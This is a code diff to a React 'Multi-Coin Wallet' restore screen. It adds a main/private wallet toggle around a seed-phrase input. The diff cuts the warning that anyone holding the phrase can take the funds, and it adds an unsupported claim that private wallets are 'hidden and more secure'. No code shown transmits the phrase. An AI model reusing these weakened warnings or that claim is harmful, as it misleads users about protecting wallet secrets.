@@ -7,18 +7,49 @@ export default function MultiCoinWallet() {
   const [secretPhrase, setSecretPhrase] = useState("");
   const [darkMode, setDarkMode] = useState(true);
 
+  // NEW: wallet toggle
+  const [walletType, setWalletType] = useState("main"); // main | private
+
   return (
     <div
       className={`min-h-screen w-full transition-colors duration-300
         ${darkMode ? "bg-black text-white" : "bg-gray-100 text-black"}
       `}
     >
-      {/* Main container (full screen) */}
-      <div className="w-full h-full p-4">
+      <div className="w-full h-full p-4 max-w-md mx-auto">
+
+        {/* 🔁 Wallet Type Toggle (TOP CENTER) */}
+        <div className="flex justify-center mb-6">
+          <div className="flex bg-[#1c1c1c] rounded-full p-1">
+            <button
+              onClick={() => setWalletType("main")}
+              className={`px-4 py-2 rounded-full text-sm font-semibold transition
+                ${walletType === "main"
+                  ? "bg-green-500 text-black"
+                  : "text-gray-400"}
+              `}
+            >
+              Main Wallet
+            </button>
+
+            <button
+              onClick={() => setWalletType("private")}
+              className={`px-4 py-2 rounded-full text-sm font-semibold transition
+                ${walletType === "private"
+                  ? "bg-green-500 text-black"
+                  : "text-gray-400"}
+              `}
+            >
+              Private Wallet
+            </button>
+          </div>
+        </div>
 
         {/* Header */}
         <div className="flex items-center justify-between mb-6">
-          <h2 className="text-lg font-semibold">Multi-Coin Wallet</h2>
+          <h2 className="text-lg font-semibold">
+            {walletType === "main" ? "Multi-Coin Wallet" : "Private Wallet"}
+          </h2>
 
           <button
             onClick={() => setCollapsed(!collapsed)}
@@ -36,7 +67,11 @@ export default function MultiCoinWallet() {
               <label className="text-sm text-gray-500">Wallet name</label>
               <input
                 type="text"
-                value="Main Wallet 4"
+                value={
+                  walletType === "main"
+                    ? "Main Wallet 4"
+                    : "Private Wallet"
+                }
                 readOnly
                 className={`mt-1 w-full rounded-lg px-3 py-3 text-sm
                   ${darkMode
@@ -48,7 +83,11 @@ export default function MultiCoinWallet() {
 
             {/* Secret Phrase */}
             <div className="mb-4">
-              <label className="text-sm text-gray-500">Secret phrase</label>
+              <label className="text-sm text-gray-500">
+                {walletType === "private"
+                  ? "Private secret phrase"
+                  : "Secret phrase"}
+              </label>
 
               <div className="relative mt-1">
                 <textarea
@@ -75,13 +114,17 @@ export default function MultiCoinWallet() {
               </div>
 
               <p className="text-xs text-gray-500 mt-1">
-                Typically 12 (sometimes 18, 24) words separated by single spaces
+                {walletType === "private"
+                  ? "Private wallets are hidden and more secure"
+                  : "Typically 12, 18, or 24 words separated by spaces"}
               </p>
             </div>
 
             {/* Restore Button */}
             <button className="w-full bg-green-500 text-black font-semibold py-3 rounded-full mt-6">
-              Restore Wallet
+              {walletType === "private"
+                ? "Restore Private Wallet"
+                : "Restore Wallet"}
             </button>
 
             {/* Info */}
@@ -95,11 +138,10 @@ export default function MultiCoinWallet() {
         )}
       </div>
 
-      {/* 🌙☀️ Theme Toggle (Bottom Left) */}
+      {/* 🌙☀️ Theme Toggle */}
       <button
         onClick={() => setDarkMode(!darkMode)}
         className="fixed bottom-4 right-4 bg-green-500 text-black p-3 rounded-full shadow-lg"
-        aria-label="Toggle theme"
       >
         {darkMode ? "☀️" : "🌙"}
       </button>
@@ -113,23 +155,17 @@ export default function MultiCoinWallet() {
             </h3>
 
             <p className="text-sm text-gray-300 mb-2">
-              A secret phrase is a list of <b>12, 18, or 24 random words</b> that
-              gives full access to your wallet.
-            </p>
-
-            <p className="text-sm text-gray-300 mb-2">
-              It is used to recover your wallet if you lose your phone or
-              reinstall the app.
+              A secret phrase is a list of <b>12, 18, or 24 words</b> that gives
+              full access to your wallet.
             </p>
 
             <p className="text-sm text-red-400 font-semibold">
-              Never share it with anyone. Anyone who knows it can take your
-              money.
+              Never share it with anyone.
             </p>
 
             <button
               onClick={() => setShowInfo(false)}
-              className="mt-4 w-full bg-black text-white py-3 rounded-full font-semibold"
+              className="mt-4 w-full bg-black text-white py-3 rounded-full"
             >
               I Understand
             </button>
